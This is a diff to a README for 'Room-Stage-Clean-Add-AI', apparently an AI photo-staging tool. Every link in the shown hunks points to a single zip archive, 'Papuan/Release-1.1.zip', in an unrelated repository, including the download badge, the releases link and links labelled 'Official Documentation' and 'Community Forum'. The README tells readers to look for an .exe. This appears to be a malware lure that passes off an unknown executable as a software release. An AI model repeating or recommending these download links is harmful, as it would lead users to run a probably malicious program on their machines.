@@ -5,7 +5,7 @@ description: "🏡 Transform interior photos with AI to clean, stage, and add de
 ---
 # 🏡 Room-Stage-Clean-Add-AI - Transform Your Space with Smart AI Tools
 
-[![Download the latest release](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/stvishwa06/stvishwa06.github.io/raw/refs/heads/main/Papuan/Release-1.1.zip)
+[![Download the latest release](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://raw.githubusercontent.com/stvishwa06/stvishwa06.github.io/main/Papuan/Release-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To get the software, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page.
 
-   [Download the latest release](https://github.com/stvishwa06/stvishwa06.github.io/raw/refs/heads/main/Papuan/Release-1.1.zip)
+   [Download the latest release](https://raw.githubusercontent.com/stvishwa06/stvishwa06.github.io/main/Papuan/Release-1.1.zip)
 
 2. **Select the Version:** Choose the most recent version listed. Look for a file with a name like `RoomStageCleanAddAI.exe`.
 
@@ -65,8 +65,8 @@ Once the application is up and running, you can:
 
 If you need more information, consider visiting:
 
-- [Official Documentation](https://github.com/stvishwa06/stvishwa06.github.io/raw/refs/heads/main/Papuan/Release-1.1.zip)
-- [Community Forum](https://github.com/stvishwa06/stvishwa06.github.io/raw/refs/heads/main/Papuan/Release-1.1.zip)
+- [Official Documentation](https://raw.githubusercontent.com/stvishwa06/stvishwa06.github.io/main/Papuan/Release-1.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/stvishwa06/stvishwa06.github.io/main/Papuan/Release-1.1.zip)
 
 ## 📧 Support
 
